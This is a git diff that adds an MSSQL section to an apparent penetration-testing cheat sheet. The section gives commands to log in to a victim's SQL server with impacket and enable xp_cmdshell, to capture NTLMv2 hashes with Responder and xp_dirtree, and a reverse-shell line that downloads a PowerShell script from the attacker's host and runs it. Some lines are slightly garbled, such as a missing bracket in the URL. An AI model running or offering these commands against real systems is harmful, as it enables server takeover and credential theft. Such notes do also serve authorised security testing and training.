@@ -21,6 +21,7 @@
 - [Shell Shock](#Shellshock)
 - [Apache Tomcat](#Apache-Tomcat)
 - [Active Directory](#Active-Directory)
+- [MSSQL](#MSSQL)
 
 --------------------------------------------------------------------------------------------------------------------------------
 
@@ -1082,3 +1083,39 @@ impacket-getTGT domain.name/user_name -hashes :<NTLM hash>
 - Silver ticket
 
 - Golden ticket
+
+--------------------------------------------------------------------------------------------------------------------------------
+
+# MSSQL
+
+--------------------------------------------------------------------------------------------------------------------------------
+- Connect to the mmsql server via mssqlclient.py from impacket
+```
+mssqlclient.py [user_name]@[victim_ip] -db db_name -windows-auth
+```
+
+- Check xp_cmdshell
+```
+SQL>enable_xp_cmdshell
+```
+
+- Responder and xp_dirtree
+
+On local host
+```
+responder -I tun0
+
+tun0 is example interface
+```
+
+On attacking machine
+```
+SQL> EXEC MASTER.sys.xp_dirtree '\\[victim_ip]\some_test'
+```
+
+After this step on localmachine we should get NTLMv2 hash 
+
+- Example Revershell for xp_cmdshell
+```
+EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://[your_local_ip/tcp_revershell.ps1") | powershell -noprofile'
+```
